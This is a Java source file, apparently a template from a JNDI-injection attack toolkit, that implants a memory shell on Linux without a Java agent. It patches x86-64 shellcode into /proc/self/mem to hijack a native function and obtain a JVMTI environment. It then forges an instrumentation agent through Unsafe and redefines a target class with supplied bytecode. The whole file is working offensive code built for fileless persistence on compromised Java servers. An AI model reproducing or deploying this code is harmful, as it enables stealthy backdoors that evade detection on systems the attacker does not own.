package com.nu1r.jndi.template.Agent;

import sun.misc.Unsafe;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.instrument.ClassDefinition;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class LinMenshell {

    public static String className;
    public static byte[] classBody;

    private LinMenshell() throws Exception {

        Class cls=Class.forName("sun.tools.attach.HotSpotVirtualMachine");
        Field field1=cls.getDeclaredField("ALLOW_ATTACH_SELF");
        field1.setAccessible(true);
        Field modifiersField=Field.class.getDeclaredField("modifiers");
        modifiersField.setInt(field1,field1.getModifiers()&~Modifier.FINAL);
        field1.setBoolean(null,true);

        FileReader fin  = new FileReader("/proc/self/maps");
        BufferedReader reader = new BufferedReader(fin);
        String line;
        long RandomAccessFile_length = 0, JNI_GetCreatedJavaVMs = 0;
        while ((line = reader.readLine()) != null)
        {
            String[] splits = line.trim().split(" ");
            if(line.endsWith("libjava.so") && RandomAccessFile_length == 0) {
                String[] addr_range = splits[0].split("-");
                long libbase = Long.parseLong(addr_range[0], 16);
                String elfpath = splits[splits.length - 1];
                RandomAccessFile_length = find_symbol(elfpath, "Java_java_io_RandomAccessFile_length", libbase);
            }else if(line.endsWith("libjvm.so") && JNI_GetCreatedJavaVMs == 0) {
                String[] addr_range = splits[0].split("-");
                long libbase = Long.parseLong(addr_range[0], 16);
                String elfpath = splits[splits.length - 1];
                JNI_GetCreatedJavaVMs = find_symbol(elfpath, "JNI_GetCreatedJavaVMs", libbase);
            }

            if(JNI_GetCreatedJavaVMs != 0 && RandomAccessFile_length != 0)
                break;
        }
        fin.close();

        //修改Java_java_io_RandomAccessFile_open0的native代码，调用JNI_GetCreatedJavaVMs获取JavaVM，再通过JavaVM获取jvmtienv
        RandomAccessFile fout = new RandomAccessFile("/proc/self/mem", "rw");
        //RSP 16字节对齐
        byte[] stack_align = {0x55, 0x48, (byte)0x89, (byte)0xe5, 0x48, (byte)0xc7, (byte)0xc0, 0xf, 0, 0, 0, 0x48, (byte)0xf7, (byte)0xd0};

        byte[] movabs_rax = {0x48, (byte) 0xb8};
        ByteBuffer buffer = ByteBuffer.allocate(Long.BYTES);
        buffer.order(ByteOrder.LITTLE_ENDIAN);
        buffer.putLong(0, JNI_GetCreatedJavaVMs);

        byte[] b = {0x48, (byte) 0x83, (byte) 0xEC, 0x40, 0x48, 0x31, (byte) 0xF6, 0x48, (byte) 0xFF, (byte) 0xC6, 0x48, (byte) 0x8D, 0x54, 0x24, 0x04, 0x48,
                (byte) 0x8D, 0x7C, 0x24, 0x08, (byte) 0xFF, (byte) 0xD0, 0x48, (byte) 0x8B, 0x7C, 0x24, 0x08, 0x48, (byte) 0x8D, 0x74, 0x24, 0x10,
                (byte) 0xBA, 0x00, 0x02, 0x01, 0x30, 0x48, (byte) 0x8B, 0x07, (byte) 0xFF, 0x50, 0x30, 0x48, (byte) 0x8B, 0x44, 0x24, 0x10,
                0x48, (byte) 0x83, (byte) 0xC4, 0x40, (byte)0xC9, (byte) 0xC3 };

        int shellcode_len = b.length + 8 + movabs_rax.length + stack_align.length;
        long landingpad = RandomAccessFile_length;

        byte[] backup = new byte[shellcode_len];
        fout.seek(landingpad);
        fout.read(backup);



        fout.seek(landingpad);
        fout.write(stack_align);
        fout.write(movabs_rax);
        fout.write(buffer.array());
        fout.write(b);
        fout.close();



        long native_jvmtienv = fout.length(); //触发执行
        System.out.printf("native_jvmtienv %x\n", native_jvmtienv);

        //恢复代码
        fout = new RandomAccessFile("/proc/self/mem", "rw");
        fout.seek(RandomAccessFile_length);
        fout.write(backup);
        fout.close();

        Unsafe unsafe = null;
        try {
            Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (sun.misc.Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        //libjvm.so的jvmti_RedefineClasses函数会校验if ( (*((_BYTE *)jvmtienv + 361) & 2) != 0 )
        unsafe.putByte(native_jvmtienv + 361, (byte) 2);
        //伪造JPLISAgent结构时，只需要填mNormalEnvironment中的mJVMTIEnv即可，其他变量代码中实际没有使用
        long JPLISAgent = unsafe.allocateMemory(0x1000);
        unsafe.putLong(JPLISAgent + 8, native_jvmtienv);
        //利用伪造的JPLISAgent结构实例化InstrumentationImpl
        try {
            Class<?> instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
            Constructor<?> constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
            constructor.setAccessible(true);
            Object inst = constructor.newInstance(JPLISAgent, true, false);


            ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
            Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
            redefineClazz.invoke(inst, new Object[] {
                    new ClassDefinition[] {
                            definition
                    }
            });
        }catch(Exception e) {
            e.printStackTrace();
        }
        fout.getFD();

    }
    private static final int SHT_DYNSYM = 11;
    private static final int STT_FUNC    =2;
    private static final int STT_GNU_IFUNC    =10;

    private static int ELF_ST_TYPE(int x) {
        return (x & 0xf);
    }

    static long find_symbol(String elfpath, String sym, long libbase) throws IOException {
        long func_ptr = 0;
        RandomAccessFile fin = new RandomAccessFile(elfpath, "r");

        byte[] e_ident = new byte[16];
        fin.read(e_ident);
        short e_type = Short.reverseBytes(fin.readShort());
        short e_machine = Short.reverseBytes(fin.readShort());
        int e_version = Integer.reverseBytes(fin.readInt());
        long e_entry = Long.reverseBytes(fin.readLong());
        long e_phoff = Long.reverseBytes(fin.readLong());
        long e_shoff = Long.reverseBytes(fin.readLong());
        int e_flags = Integer.reverseBytes(fin.readInt());
        short e_ehsize = Short.reverseBytes(fin.readShort());
        short e_phentsize = Short.reverseBytes(fin.readShort());
        short e_phnum = Short.reverseBytes(fin.readShort());
        short e_shentsize = Short.reverseBytes(fin.readShort());
        short e_shnum = Short.reverseBytes(fin.readShort());
        short e_shstrndx = Short.reverseBytes(fin.readShort());

        int sh_name = 0;
        int sh_type = 0;
        long sh_flags = 0;
        long sh_addr = 0;
        long sh_offset = 0;
        long sh_size = 0;
        int sh_link = 0;
        int sh_info = 0;
        long sh_addralign = 0;
        long sh_entsize = 0;

        for(int i = 0; i < e_shnum; ++i) {
            fin.seek(e_shoff + i*64);
            sh_name = Integer.reverseBytes(fin.readInt());
            sh_type = Integer.reverseBytes(fin.readInt());
            sh_flags = Long.reverseBytes(fin.readLong());
            sh_addr = Long.reverseBytes(fin.readLong());
            sh_offset = Long.reverseBytes(fin.readLong());
            sh_size = Long.reverseBytes(fin.readLong());
            sh_link = Integer.reverseBytes(fin.readInt());
            sh_info = Integer.reverseBytes(fin.readInt());
            sh_addralign = Long.reverseBytes(fin.readLong());
            sh_entsize = Long.reverseBytes(fin.readLong());
            if(sh_type == SHT_DYNSYM) {
                break;
            }
        }

        int symtab_shdr_sh_link = sh_link;
        long symtab_shdr_sh_size = sh_size;
        long symtab_shdr_sh_entsize = sh_entsize;
        long symtab_shdr_sh_offset = sh_offset;

        fin.seek(e_shoff + symtab_shdr_sh_link * e_shentsize);
        sh_name = Integer.reverseBytes(fin.readInt());
        sh_type = Integer.reverseBytes(fin.readInt());
        sh_flags = Long.reverseBytes(fin.readLong());
        sh_addr = Long.reverseBytes(fin.readLong());
        sh_offset = Long.reverseBytes(fin.readLong());
        sh_size = Long.reverseBytes(fin.readLong());
        sh_link = Integer.reverseBytes(fin.readInt());
        sh_info = Integer.reverseBytes(fin.readInt());
        sh_addralign = Long.reverseBytes(fin.readLong());
        sh_entsize = Long.reverseBytes(fin.readLong());

        long symstr_shdr_sh_offset = sh_offset;

        long cnt = symtab_shdr_sh_entsize > 0 ? symtab_shdr_sh_size/symtab_shdr_sh_entsize : 0;
        for(long i = 0; i < cnt; ++i) {
            fin.seek(symtab_shdr_sh_offset + symtab_shdr_sh_entsize*i);
            int st_name = Integer.reverseBytes(fin.readInt());
            byte st_info = fin.readByte();
            byte st_other = fin.readByte();
            short st_shndx = Short.reverseBytes(fin.readShort());
            long st_value = Long.reverseBytes(fin.readLong());
            long st_size = Long.reverseBytes(fin.readLong());
            if(st_value == 0
                    || st_name == 0
                    || (ELF_ST_TYPE(st_info) != STT_FUNC && ELF_ST_TYPE(st_info) != STT_GNU_IFUNC))
            {
                continue;
            }

            fin.seek(symstr_shdr_sh_offset + st_name);
            String name = "";
            byte ch = 0;
            while((ch = fin.readByte()) != 0)
            {
                name += (char)ch;
            }

            if(sym.equals(name))
            {
                func_ptr = libbase + st_value;
                break;
            }
        }

        fin.close();

        return func_ptr;
    }
}
